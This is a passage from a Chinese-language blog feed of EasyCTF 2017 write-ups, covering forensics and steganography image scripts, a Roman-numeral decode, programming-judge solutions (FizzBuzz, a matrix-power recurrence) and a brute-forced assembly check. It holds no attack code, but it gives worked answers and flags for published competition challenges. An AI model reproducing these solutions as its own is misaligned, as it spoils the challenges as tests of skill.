os</div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"></div><div class="line">flag = Image.new(<span class="string">"RGB"</span>, (<span class="number">1280</span>, <span class="number">720</span>))</div><div class="line">path = <span class="string">"E:\sunnyelf\Desktop\easyctf 2017\Forensics\Decomphose\decomp"</span></div><div class="line"><span class="keyword">for</span> file_name <span class="keyword">in</span> os.listdir(path):</div><div class="line">    f = Image.open(path + <span class="string">"\\"</span> + file_name)</div><div class="line">    width, height = f.size</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(width):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(height):</div><div class="line">            add = <span class="keyword">True</span></div><div class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span> <span class="keyword">and</span> f.getpixel((i - <span class="number">1</span>, j)) != (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)):</div><div class="line">                add = <span class="keyword">False</span></div><div class="line">            <span class="keyword">if</span> (i &lt; width - <span class="number">1</span> <span class="keyword">and</span> f.getpixel((i + <span class="number">1</span>, j)) != (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)):</div><div class="line">                add = <span class="keyword">False</span></div><div class="line">            <span class="keyword">if</span> (j &gt; <span class="number">0</span> <span class="keyword">and</span> f.getpixel((i, j - <span class="number">1</span>)) != (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)):</div><div class="line">                add = <span class="keyword">False</span></div><div class="line">            <span class="keyword">if</span> (j &lt; height - <span class="number">1</span> <span class="keyword">and</span> f.getpixel((i, j + <span class="number">1</span>)) != (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)):</div><div class="line">                add = <span class="keyword">False</span></div><div class="line">            <span class="keyword">if</span> (add):</div><div class="line">                flag.putpixel((i, j), f.getpixel((i, j)))</div><div class="line">flag.save(<span class="string">"flag.png"</span>)</div></pre></td></tr></table></figure><p></p><p>跑了3分钟左右，看看结果：</p><p><img src="http://i1.piimg.com/589513/2259f6dc3ee320ac.png" alt=""></p><h2 id="QR2"><a href="#QR2" class="headerlink" title="QR2"></a>QR2</h2><h3 id="problem-14"><a href="#problem-14" class="headerlink" title="problem"></a>problem</h3><p>When I am not practicing my <a href="https://en.wikipedia.org/wiki/Oboe" target="_blank" rel="external">Oboe</a> for band, I have been working on a QR code generator. For some reason, some of the images are not scannable. <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/qr-2/qr2.bmp" target="_blank" rel="external">Here</a> is one, can you tell me what it says?</p><p>NOTE: Due to a flag leak, this is a re-release of the problem with a new flag.</p><p>hint: Is there another kind of Oboe?</p><h3 id="solution-13"><a href="#solution-13" class="headerlink" title="solution"></a>solution</h3><p><a href="https://github.com/VoidMercy/EasyCTF-Writeups-2017/tree/master/forensics/QR2" target="_blank" rel="external">writeup</a></p><h1 id="0x03-Steganography"><a href="#0x03-Steganography" class="headerlink" title="0x03 Steganography"></a>0x03 Steganography</h1><h2 id="Kittycat"><a href="#Kittycat" class="headerlink" title="Kittycat"></a>Kittycat</h2><h3 id="problem-15"><a href="#problem-15" class="headerlink" title="problem"></a>problem</h3><p>My <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/kittycat/kittycat.avi" target="_blank" rel="external">cats</a> are cuter than yours :)<br>hint: I used to have one cat, but now I have two.</p><h3 id="solution-14"><a href="#solution-14" class="headerlink" title="solution"></a>solution</h3><p><a href="http://wenku.baidu.com/view/bbffdc4203d8ce2f006623b3" target="_blank" rel="external">图像处理基本知识</a></p><p><a href="http://wenku.baidu.com/view/427b9c5aa76e58fafab003c2" target="_blank" rel="external">图像基本运算</a></p><p><a href="https://opencv-python-tutroals.readthedocs.io/en/latest/py_tutorials/py_setup/py_setup_in_windows/py_setup_in_windows.html#install-opencv-python-in-windows" target="_blank" rel="external">Install OpenCV-Python in Windows</a></p><pre><code>ffmpeg -i kittycat.avi kittycat%01d.png
</code></pre><p>把视频每帧分离后得到606张png图片，每两张表面看上去相似，先尝试每两张异或提取出不同的地方：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> cv2</div><div class="line"></div><div class="line">i = <span class="number">1</span></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">607</span>, <span class="number">2</span>):   </div><div class="line">    img1 = cv2.imread(<span class="string">'kittycat'</span> + str(x) +<span class="string">'.png'</span>)</div><div class="line">    img2 = cv2.imread(<span class="string">'kittycat'</span> + str(x + <span class="number">1</span>) +<span class="string">'.png'</span>)</div><div class="line">    xor_img = cv2.bitwise_xor(img1, img2)</div><div class="line">    cv2.imwrite(<span class="string">'xor/xor_img'</span> + str(i) + <span class="string">'.png'</span>, xor_img)</div><div class="line">    i += <span class="number">1</span></div></pre></td></tr></table></figure><p></p><p>得到303张异或后的图片，尝试将它们全部相加：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">	<span class="keyword">import</span> cv2</div><div class="line">	</div><div class="line">	add_img = cv2.imread(<span class="string">'xor_img1.png'</span>)</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">2</span>, <span class="number">304</span>):</div><div class="line">	    img = cv2.imread(<span class="string">'xor_img'</span>+ str(x) +<span class="string">'.png'</span>)</div><div class="line">	    add_img = cv2.add(add_img, img)</div><div class="line">	</div><div class="line">	cv2.imwrite(<span class="string">'add_img.png'</span>, add_img)</div><div class="line"></div><div class="line">![](http://i.imgur.com/<span class="number">87</span>WajrC.png)</div></pre></td></tr></table></figure><p></p><p>PS处理一下：</p><p><img src="http://chuantu.biz/t5/53/1490695174x2890174033.png" alt=""></p><p><img src="http://chuantu.biz/t5/53/1490700824x2890174033.png" alt=""></p><h2 id="Bizarro"><a href="#Bizarro" class="headerlink" title="Bizarro"></a>Bizarro</h2><h3 id="problem-16"><a href="#problem-16" class="headerlink" title="problem"></a>problem</h3><p>Something seems very strange about <a href="https://raw.githubusercontent.com/EasyCTF/easyctf-2017-problems/master/bizarro/crpt.png" target="_blank" rel="external">this</a> strange looking image. Check it out?</p><p>hint: Red herrings are always a <em>touchy</em> subject. Combine this hint with intel you find in the problem, throw in a blind guess, and perhaps you’ll stumble into the answer.</p><h3 id="solution-15"><a href="#solution-15" class="headerlink" title="solution"></a>solution</h3><p><img src="http://i1.piimg.com/589513/a9b2436a74dde6cd.png" alt=""></p><pre><code>CI XCVII CXV CXXI XCIX CXVI CII CXXIII CXVI CIV CV CXV XCV CV CXV XCV CX CXI CXVI XCV CXVI CIV CI XCV CII CVIII XCVII CIII CXXV XXXII CV XXXII CVII CX CXI CXIX XXXII CXVI CIV CV CXV XXXII CII CVIII XCVII CIII XXXII CV CXV XXXII CXIX CI CV CXIV C XXXII CV XXXII CVI CXVII CXV CXVI XXXII XCIX XCVII CX XXXIX CXVI XXXII CXII CXVII CXVI XXXII CIX CXXI XXXII CII CV CX CIII CI CXIV XXXII CXI CX XXXII CXIX CIV CXXI
</code></pre><p>罗马数字<a href="https://en.wikipedia.org/wiki/Roman_numerals" target="_blank" rel="external">Roman numerals</a></p><p><a href="http://www.dcode.fr/roman-numerals" target="_blank" rel="external">在线转换</a>一下，得到一些数字，数字大小都不超过255，有可能是ASCII值：</p><p><img src="http://i1.piimg.com/589513/d6ebdad9155c13bd.png" alt=""><br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">nums = [<span class="number">101</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">121</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">102</span>,<span class="number">123</span>,<span class="number">116</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">105</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">110</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">95</span>,<span class="number">116</span>,<span class="number">104</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">125</span>,<span class="number">32</span>,<span class="number">105</span>,<span class="number">32</span>,<span class="number">107</span>,<span class="number">110</span>,<span class="number">111</span>,<span class="number">119</span>,<span class="number">32</span>,<span class="number">116</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">115</span>,<span class="number">32</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">32</span>,<span class="number">105</span>,<span class="number">115</span>,<span class="number">32</span>,<span class="number">119</span>,<span class="number">101</span>,<span class="number">105</span>,<span class="number">114</span>,<span class="number">100</span>,<span class="number">32</span>,<span class="number">105</span>,<span class="number">32</span>,<span class="number">106</span>,<span class="number">117</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">99</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">39</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">112</span>,<span class="number">117</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">109</span>,<span class="number">121</span>,<span class="number">32</span>,<span class="number">102</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">32</span>,<span class="number">119</span>,<span class="number">104</span>,<span class="number">121</span>]</div><div class="line"></div><div class="line">txt = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</div><div class="line">    txt += chr(n)</div><div class="line">print(txt)</div></pre></td></tr></table></figure><p></p><pre><code>easyctf{this_is_not_the_flag} i know this flag is weird i just can&apos;t put my finger on why
</code></pre><p>额，好吧，后来看了大神的<a href="https://github.com/VoidMercy/EasyCTF-Writeups-2017/tree/master/forensics/bizarro" target="_blank" rel="external">writeup</a>跪了。</p>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> forensics </tag>
            
            <tag> ctf writeup </tag>
            
            <tag> easyctf </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[EasyCTF 2017 Misc Pro Write Up]]></title>
      <url>/2017/04/09/EasyCTF-2017-Misc-Pro-Write-Up/</url>
      <content type="html"><![CDATA[<p><img src="http://i4.buimg.com/589513/f3a5f79cc07a98f1.png" alt=""></p><p>作者:<a href="https://www.zhihu.com/people/sunnyelf/" target="_blank" rel="external">Jing Ling</a><br>博客:<a href="https://www.hackfun.org" target="_blank" rel="external">HackFun</a></p><h1 id="0x00-Miscellaneous"><a href="#0x00-Miscellaneous" class="headerlink" title="0x00 Miscellaneous"></a>0x00 Miscellaneous</h1><h2 id="IRC"><a href="#IRC" class="headerlink" title="IRC"></a>IRC</h2><h3 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h3><p>EasyCTF has an IRC channel! Check out <code>#easyctf2017</code> on freenode to claim a free flag, and stick around to get on-the-fly updates during the competition.</p><a id="more"></a><h3 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h3><p>了解一波<a href="http://baike.baidu.com/item/IRC/10410" target="_blank" rel="external">IRC</a>，熟悉一下操作命令，找到<code>Cannot join channel (+r) - you need to be identified with services</code> 的<a href="https://superuser.com/questions/106965/how-do-i-identify-with-services-on-irc" target="_blank" rel="external">解决方法</a>，成功加入到<code>#easyctf2017</code>的频道。<br><img src="http://i.imgur.com/W8j9k6R.png" alt=""></p><h2 id="A-maze-ing"><a href="#A-maze-ing" class="headerlink" title="A-maze-ing"></a>A-maze-ing</h2><h3 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h3><p>Solve a maze! ‘j’ is left, ‘k’ is down, ‘l’ is right, and ‘i’ is up. You input directions in a string. An example: “jkliilillikjk”. Submit your input string as the flag. (Whoops! You don’t have a maze, do you? Sucks to be you.</p><h3 id="solution-1"><a href="#solution-1" class="headerlink" title="solution"></a>solution</h3><pre><code>easyctf{jjjjjjjjjjjjjjjjjjj}
easyctf{kkkkkkkkkkkkkkkkkkk}
</code></pre><p>参考：<a href="https://www.zhihu.com/question/25539346" target="_blank" rel="external">一个迷宫从入口进去，沿着右手边的墙走，是否肯定能走到出口？</a></p><h1 id="0x01-Programming"><a href="#0x01-Programming" class="headerlink" title="0x01 Programming"></a>0x01 Programming</h1><h2 id="Hello-world"><a href="#Hello-world" class="headerlink" title="Hello, world!"></a>Hello, world!</h2><h3 id="problem-2"><a href="#problem-2" class="headerlink" title="problem"></a>problem</h3><p>Use your favorite programming language to print <code>Hello, world!</code> to stdout! Use the programming interface to do this!</p><p>Programming Judge codes:</p><pre><code>AC: accepted
WA: WRONG ANSWER (you&apos;re bad)
TLE: time limit exceeded (make your code faster)
RTE: runtime error
JE: judge error (contact an admin if you encounter this)
CE: compilation error
</code></pre><h3 id="solution-2"><a href="#solution-2" class="headerlink" title="solution"></a>solution</h3><pre><code>print(&apos;Hello, world!&apos;)
</code></pre><h2 id="Things-Add-Up"><a href="#Things-Add-Up" class="headerlink" title="Things Add Up"></a>Things Add Up</h2><h3 id="problem-3"><a href="#problem-3" class="headerlink" title="problem"></a>problem</h3><p>For this problem you will utilise the programming interface, which you can access via the navigation bar at the top of your screen.</p><p>The input for your program will be given via STDIN - that’s cin, input(), and System.in for cxx, Python, and Java respectively. Output goes to STDOUT - cout, print, and System.out. Your program will be run on several sets of input, and if your output matches ours for each testcase, this problem will be marked solved.</p><p>We’ll start with a simple challenge. Each testcase has two lines of input. The first will contain an integer <code>N</code>. The second will contain a sequence of integers <code>a_1, a_2, ..., a_N</code>. You are to output the sum of that sequence - that is, <code>a_1 + a_2 + ... + a_n</code>. Good luck!</p><p>Input Constraints</p><pre><code>0 &lt; N &lt; 100
-1000 &lt; a_i &lt; 1000
</code></pre><p>Sample Input</p><pre><code>5
2 4 7 3 1
</code></pre><p>Sample Output</p><pre><code>17
</code></pre><h3 id="solution-3"><a href="#solution-3" class="headerlink" title="solution"></a>solution</h3><pre><code>n = input()
s = raw_input().split()
r = 0
for x in xrange(n):
    r += int(s[x])
print(r)
</code></pre><h2 id="Fizz-Buzz-1"><a href="#Fizz-Buzz-1" class="headerlink" title="Fizz Buzz 1"></a>Fizz Buzz 1</h2><h3 id="problem-4"><a href="#problem-4" class="headerlink" title="problem"></a>problem</h3><p>Write a program that takes an integer <code>n</code> as input.</p><p>Output the numbers 1 through <code>n</code>, in increasing order, one per line.</p><p>However, replace any line that is a multiple of 3 with <code>Fizz</code> and any that are a multiple of 5 with <code>Buzz</code>. Any line that is a multiple of 3 and 5 should be written as <code>FizzBuzz</code>.</p><p>The input will be the number of lines to write, n, followed by a linebreak.</p><p>Sample input:</p><pre><code>17
</code></pre><p>Sample output:</p><pre><code>1
2
Fizz
4
Buzz
Fizz
7
8
Fizz
Buzz
11
Fizz
13
14
FizzBuzz
16
17
</code></pre><h3 id="solution-4"><a href="#solution-4" class="headerlink" title="solution"></a>solution</h3><pre><code>n = input()
for x in xrange(1, n + 1):
    if x % 3 == 0:
        if x % 5 == 0:
            print(&apos;FizzBuzz&apos;)
        else:
            print(&apos;Fizz&apos;)
    elif x % 5 == 0:
        print(&apos;Buzz&apos;)
    else:
        print(x)
</code></pre><h2 id="Library"><a href="#Library" class="headerlink" title="Library"></a>Library</h2><h3 id="problem-5"><a href="#problem-5" class="headerlink" title="problem"></a>problem</h3><p>Your librarian has a 2-row bookshelf that can contain N books in each row. She wants to know the number of ways that she can fill the bookshelf with red-colored books and blue-colored books such that no 2 red-colored books are adjacent to each other (horizontally or vertically).</p><p>Input: the integer, N (1&lt;=N&lt;=2^1024)</p><p>Output: the number of ways you can place red-colored books and blue-colored books onto a N-column bookshelf. Since this number might be really big, output it mod 10^9+7.</p><p>Example: Input: 2</p><p>Your valid bookshelf layouts are:</p><pre><code>BB
BB

BB
BR

BR
BB

RB
BB

BB
RB

RB
BR

BR
RB
</code></pre><p>Therefore, Output: 7</p><h3 id="solutin"><a href="#solutin" class="headerlink" title="solutin"></a>solutin</h3><p>画图或编程找出规律公式，然后就是数学推导，最后编程计算：</p><p><img src="http://i.imgur.com/auAdvVk.png" alt=""><br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line">n = input()</div><div class="line">temp = np.array([[<span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">2</span>]])</div><div class="line">matrix = np.array([[<span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">2</span>]])</div><div class="line">init = np.array([[<span class="number">3</span>], [<span class="number">7</span>]])</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(n - <span class="number">2</span>):</div><div class="line">    temp = np.dot(temp, matrix)</div><div class="line">result = np.dot(temp, init)</div><div class="line">print(result[<span class="number">0</span>][<span class="number">0</span>] % (<span class="number">10</span> ** <span class="number">9</span> + <span class="number">7</span>))</div></pre></td></tr></table></figure><p></p><p>来自VictorZC表哥的矩阵快速幂解法：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">n = input()</div><div class="line">   p = n<span class="number">-2</span></div><div class="line">   a0=<span class="number">0</span></div><div class="line">   a1=<span class="number">1</span></div><div class="line">   a2=<span class="number">1</span></div><div class="line">   a3=<span class="number">2</span></div><div class="line">   r0=<span class="number">1</span></div><div class="line">   r1=<span class="number">0</span></div><div class="line">   r2=<span class="number">0</span></div><div class="line">   r3=<span class="number">1</span></div><div class="line">   mod=<span class="number">10</span>**<span class="number">9</span>+<span class="number">7</span></div><div class="line">   <span class="keyword">while</span> p&gt;<span class="number">0</span>:</div><div class="line">       <span class="keyword">if</span> p%<span class="number">2</span>==<span class="number">1</span>:</div><div class="line">           c0=a0*r0+a1*r2</div><div class="line">           c1=a0*r1+a1*r3</div><div class="line">           c2=a2*r0+a3*r2</div><div class="line">           c3=a2*r1+a3*r3</div><div class="line">           r0=c0%mod</div><div class="line">           r1=c1%mod</div><div class="line">           r2=c2%mod</div><div class="line">           r3=c3%mod</div><div class="line">       c0=a0*a0+a1*a2</div><div class="line">       c1=a0*a1+a1*a3</div><div class="line">       c2=a2*a0+a3*a2</div><div class="line">       c3=a2*a1+a3*a3</div><div class="line">       a0=c0%mod</div><div class="line">       a1=c1%mod</div><div class="line">       a2=c2%mod</div><div class="line">       a3=c3%mod</div><div class="line">       p=p//<span class="number">2</span></div><div class="line">   <span class="keyword">if</span> n==<span class="number">1</span>:</div><div class="line">       <span class="keyword">print</span> <span class="number">3</span></div><div class="line">   <span class="keyword">else</span>:</div><div class="line">       <span class="keyword">print</span> (r2*<span class="number">3</span>+r3*<span class="number">7</span>)%mod</div></pre></td></tr></table></figure><p></p><h2 id="Fzz-Buzz-2"><a href="#Fzz-Buzz-2" class="headerlink" title="Fzz Buzz 2"></a>Fzz Buzz 2</h2><h3 id="problem-6"><a href="#problem-6" class="headerlink" title="problem"></a>problem</h3><p>Oh no! Two of my keys are broken! Please help me make the same Fzz Buzz program, sans that one letter and queston marks.<br>As a side note, use of <code>eval()</code> and <code>exec()</code> is also frowned upon and will be marked invalid.</p><h3 id="solution-5"><a href="#solution-5" class="headerlink" title="solution"></a>solution</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Create aliases</span></div><div class="line">f = getattr(globals()[<span class="string">'__bu\x69lt\x69ns__'</span>],<span class="string">'\x69nput'</span>)</div><div class="line">p = getattr(globals()[<span class="string">'__bu\x69lt\x69ns__'</span>],<span class="string">'pr\x69nt'</span>)</div><div class="line"></div><div class="line"><span class="comment"># Get user input</span></div><div class="line">n = f()</div><div class="line"></div><div class="line"><span class="comment"># Prints text for line k and calls itself with the next line</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">go</span><span class="params">(k)</span>:</span></div><div class="line">    a = ((k % <span class="number">15</span> == <span class="number">0</span>) <span class="keyword">and</span> p(<span class="string">'F\x69zzBuzz'</span>))</div><div class="line">    a = ((k % <span class="number">3</span> != <span class="number">0</span> <span class="keyword">and</span> k % <span class="number">5</span> == <span class="number">0</span>) <span class="keyword">and</span> p(<span class="string">'Buzz'</span>))</div><div class="line">    a = ((k % <span class="number">3</span> == <span class="number">0</span> <span class="keyword">and</span> k % <span class="number">5</span> != <span class="number">0</span>) <span class="keyword">and</span> p(<span class="string">'F\x69zz'</span>))</div><div class="line">    a = ((k % <span class="number">3</span> != <span class="number">0</span> <span class="keyword">and</span> k % <span class="number">5</span> != <span class="number">0</span>) <span class="keyword">and</span> p(k))</div><div class="line">    a = ((k &lt; n) <span class="keyword">and</span> go(k + <span class="number">1</span>))</div><div class="line"></div><div class="line">go(<span class="number">1</span>)</div></pre></td></tr></table></figure><h2 id="Down-a-Notch"><a href="#Down-a-Notch" class="headerlink" title="Down a Notch"></a>Down a Notch</h2><h3 id="problem-7"><a href="#problem-7" class="headerlink" title="problem"></a>problem</h3><p>I’ve spent too long in the high level, let’s take the level <a href="https://raw.githubusercontent.com/EasyCTF/easyctf-2017-problems/master/down-a-notch/check" target="_blank" rel="external">down a notch</a>. Help me find the correct input to this function!<br>Your answer should be in the format <code>a:b</code> where <code>a</code> and <code>b</code> are integers. Do <strong>not</strong> wrap it with <code>easyctf{}</code>.<br>Hint: Compiled with x86-64 gcc 4.9.4</p><pre><code>check(int, int):
        pushq   %rbp
        movq    %rsp, %rbp
        movl    %edi, -36(%rbp)
        movl    %esi, -40(%rbp)
        movl    -36(%rbp), %eax
        xorl    -40(%rbp), %eax
        movl    %eax, -4(%rbp)
        movl    -4(%rbp), %eax
        addl    $98, %eax
        movl    %eax, -8(%rbp)
        movl    -8(%rbp), %eax
        notl    %eax
        movl    %eax, %edx
        movl    -40(%rbp), %eax
        addl    %edx, %eax
        movl    %eax, -12(%rbp)
        movl    -12(%rbp), %eax
        xorl    -36(%rbp), %eax
        movl    %eax, -16(%rbp)
        movl    -40(%rbp), %eax
        imull   -4(%rbp), %eax
        cltd
        idivl   -8(%rbp)
        movl    %eax, %edx
        movl    -36(%rbp), %eax
        leal    (%rdx,%rax), %ecx
        movl    -12(%rbp), %edx
        movl    -16(%rbp), %eax
        addl    %edx, %eax
        xorl    %ecx, %eax
        movl    %eax, -20(%rbp)
        cmpl    $-814, -20(%rbp)
        sete    %al
        popq    %rbp
        ret
</code></pre><h3 id="solution-6"><a href="#solution-6" class="headerlink" title="solution"></a>solution</h3><p>推荐文章：<a href="http://www.jianshu.com/p/5910b9e63644" target="_blank" rel="external">从汇编角度浅析C程序</a></p><p>简单的汇编代码理解:</p><pre><code>push rbp
mov rbp, rsp
mov [rbp-36], edi
mov [rbp-40], esi
mov eax,[rbp-36]   ;eax = r36
xor [rbp-40], eax  ;r40 = r40 ^ eax
mov [rbp-4], eax   ;r4 = eax
mov eax, [rbp-4]   ;eax = r4
add eax, 98        ;eax = eax + 98
mov [rbp-8], eax   ;r8 = eax
mov eax, [rbp-8]   ;eax = r8
not eax            ;eax = ~ eax
mov edx, eax       ;edx = eax
mov eax,[rbp-40]   ;eax = r40 
add eax, edx       ;eax = eax + edx
mov [rbp-12], eax  ;r12 = eax
mov eax, [rbp-12]  ;eax = r12
mov eax, [rbp-36]  ;eax = r36
mov [rbp-16], eax  ;r16 = eax
mov eax, [rbp-40]  ;eax = r40
imul eax, [rbp-4]  ;eax = eax * r4
cltd
idiv [rbp-8]       ;eax = eax / r8 edx = eax % r8
mov edx, eax       ;edx = eax
mov eax, [rbp-36]  ;eax = r36
lea ecx, [rdx+rax] 
mov edx, [rbp-12]  ;edx =r12
mov eax, [rbp-16]  ;eax = r16
add eax, edx       ;eax = eax + edx
xorl ecx, eax      ;ecx = ecx ^ edx
movl eax, [rbp-20] ;eax = r20
cmpl -814, [rbp-20];r20 ?= -814
sete al
popq [rbp]
ret
</code></pre><hr><pre><code>a = input()
b = input()
c = a ^ b
d = 98 + c
e = ~d + b
f = e ^ a
g = a + b * c / d ^ e + f
g ?= -814
</code></pre><p>整理一下：</p><pre><code>g = a + b * (a ^ b) / (98 + (a ^ b)) ^ (~(98 + a ^ b) + b) + (~(98 + a ^ b) + b) ^ a
</code></pre><p>二元一次方程求解，暴力跑一下：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(a, b)</span>:</span></div><div class="line">    c = a ^ b</div><div class="line">    d = <span class="number">98</span> + c</div><div class="line">    e = ~d + b</div><div class="line">    f = e ^ a</div><div class="line">    res = a + b * c / d ^ e + f</div><div class="line">    <span class="keyword">if</span> res == <span class="number">-814</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">1000</span>):</div><div class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">1000</span>):</div><div class="line">        find = <span class="keyword">False</span></div><div class="line">        <span class="keyword">if</span> check(a, b):</div><div class="line">            find = <span class="keyword">True</span></div><div class="line">            <span class="keyword">print</span> <span class="string">"%d:%d"</span> % (a, b) <span class="comment"># 14:975</span></div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">if</span> find:</div><div class="line">        <span class="keyword">break</span></div></pre></td></tr></table></figure><p></p><h2 id="MWayward-Space-Junk"><a href="#MWayward-Space-Junk" class="headerlink" title="MWayward Space Junk"></a>MWayward Space Junk</h2><h2 id="problem-8"><a href="#problem-8" class="headerlink" title="problem"></a>problem</h2><p>I’m trying to destroy some space junk, but it won’t stop moving!</p><pre><code>nc wayward.tcp.easyctf.com 8580
</code></pre><p>Pilot Key: <code>7554eb73dc155375b47b4a655a27332b</code></p><p>hint: Try figuring out the trajectory of the junk.</p><h2 id="solution-7"><a href="#solution-7" class="headerlink" title="solution"></a>solution</h2><p><a href="https://writeups.easyctf.com/programming.html" target="_blank" rel="external">writeup</a></p><h2 id="Match-Me"><a href="#Match-Me" class="headerlink" title="Match Me"></a>Match Me</h2><h2 id="problem-9"><a href="#problem-9" class="headerlink" title="problem"></a>problem</h2><p>When making pairings between two sets of objects based on their preferences (in this case people), there can be multiple stable solutions, stable meaning that no two elements would prefer to be matched with each other over their current matching. A side-effect of having multiple solutions is that there are solutions favor one group over the other.</p><p>We received two files, one listing men and the other women. Each line contains a name, followed by a series of numbers. Each number N corresponds to their preference to be matched with the Nth member of the opposite list, with 1 being the highest.</p><p>For example, the entry “Joe 4, 5, 3, 1, 2” means that Joe would most prefer the 4th entry on the opposite list, and least prefer the 2nd.</p><p>We have heard that there are some pairings that will be together in all possible stable matchings, please find them. However, because there are quite a bit of them, please submit your solution as the following:</p><p>MD5 hash of <code>(male_1,female_1)(male_2,female_2)...(male_n,female_n)</code>, where the pairings are sorted alphabetically by male names. For example, <code>(Bob,Susie)(Jim,Carol)(Tom,Emma)</code> would be submitted as <code>b0d75104ce4b3a7d892f745fd515fea4</code>.</p><p>Here are the lists of preferences:<a href="https://raw.githubusercontent.com/HackThisCode/CTF-Writeups/master/2017/EasyCTF/Match%20me/male" target="_blank" rel="external">male preferences</a>, <a href="https://raw.githubusercontent.com/HackThisCode/CTF-Writeups/master/2017/EasyCTF/Match%20me/female" target="_blank" rel="external">female preferences</a>.</p><p>Hint: This is a fairly well-known graph problem. I would guess there is some sort of internet source on it.</p><h2 id="solution-8"><a href="#solution-8" class="headerlink" title="solution"></a>solution</h2><p><a href="https://github.com/HackThisCode/CTF-Writeups/tree/master/2017/EasyCTF/Match%20me" target="_blank" rel="external">writeup</a><br></p><figure 